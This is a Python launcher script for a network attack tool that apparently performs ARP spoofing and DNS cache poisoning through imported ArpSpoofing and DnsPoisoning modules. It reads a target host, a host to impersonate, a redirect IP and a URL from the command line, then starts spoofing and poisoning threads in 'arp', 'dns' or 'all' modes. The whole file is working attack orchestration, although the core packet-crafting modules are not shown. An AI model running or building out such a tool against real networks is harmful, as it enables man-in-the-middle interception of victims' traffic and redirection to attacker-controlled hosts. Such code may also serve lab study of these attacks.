import sys
import threading
from scapy.all import *
from ArpSpoofing import ArpSpoofing
from DnsPoisoning import DnsPoisoning

if __name__ == "__main__":
    #global variables
    arguments = sys.argv
    listArguments = []
    argReq = 6
    interface = "enp0s3"
    arpSpoof = None
    dnsPoison = None

    #checks if amount of passed arguments is correct
    if len(sys.argv) != argReq:
        print("Wrong amount of arguments provide", argReq-1, "arguments")
        sys.exit(1)

    #makes a list of passed arguments
    for item in arguments[1:]:
        listArguments.append(item)

    print(listArguments)

    #Stores arguments in correct variables
    modeOfAttack = listArguments[0]
    hostToAttack = listArguments[1]
    hostToSpoof = listArguments[2]
    ipToSendTo = listArguments[3]
    url = listArguments[4]


    if modeOfAttack == "arp":
        arpSpoofing = ArpSpoofing(interface)
        try:
            print("before thread")
            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(hostToAttack, hostToSpoof))
            arpSpoof.daemon = True
            arpSpoof.start()
            print("after thread")
        except:
            print("Thread arp failed to start")
    elif modeOfAttack == "dns":
        dnsPoisoning = DnsPoisoning(interface)
        try:
            dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(hostToAttack, url, ipToSendTo))
            dnsPoison.daemon = True
            dnsPoison.start()
        except:
            print("Thread dns failed to start")

    elif modeOfAttack == "all":
        arpSpoofing = ArpSpoofing(interface)
        dnsPoisoning = DnsPoisoning(interface)
        try:
            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(hostToAttack, hostToSpoof))
            arpSpoof.start()
            arpSpoof.daemon = True
            dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(hostToAttack, url, ipToSendTo))
            dnsPoison.daemon = True
            dnsPoison.start()
        except:
            print("Thread arp & dns failed to start")

    else:
        print("Wrong mode of attack provided choose out of: arp, dns or all")
        sys.exit(1)

    if modeOfAttack == "arp":
        arpSpoof.join()
    elif modeOfAttack == "dns":
        dnsPoison.join()
    elif modeOfAttack == "all":
        arpSpoof.join()
        dnsPoison.join()

    print("reached end of the main file")
